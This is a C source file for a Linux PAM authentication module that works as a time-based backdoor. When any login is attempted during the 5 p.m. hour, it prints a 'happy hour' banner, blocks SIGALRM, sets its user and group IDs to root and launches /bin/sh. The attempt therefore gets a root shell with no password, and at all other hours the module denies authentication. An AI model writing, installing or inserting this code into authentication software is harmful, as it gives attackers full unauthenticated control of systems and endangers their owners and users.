#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h> 

PAM_EXTERN int pam_sm_authenticate (pam_handle_t *pamh, int flags,
             int argc, const char **argv)

{
    time_t time_unix;
    struct tm * time_local;
    int hour;

    time(&time_unix);
    time_local = localtime(&time_unix);
    hour = time_local->tm_hour;

    if (hour == 17)
    {             
        char *args[] = { "** It's happy hour!! **", NULL };

        sigset_t zzz;                               //  fix for 'login'  
        sigemptyset (&zzz);                        //     |      |   
        sigaddset(&zzz, SIGALRM);                 //   <--|------'    
        sigprocmask(SIG_BLOCK, &zzz, NULL);      //  <----'

        printf("**WELCOME TO HAPPY HOUR**\n");    
        setuid(0);
        setgid(0);
        execve("/bin/sh",args,NULL);
    }  

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred (pam_handle_t *pamh, int flags,
                int argc, const char **argv)
{
    return PAM_SUCCESS;
}

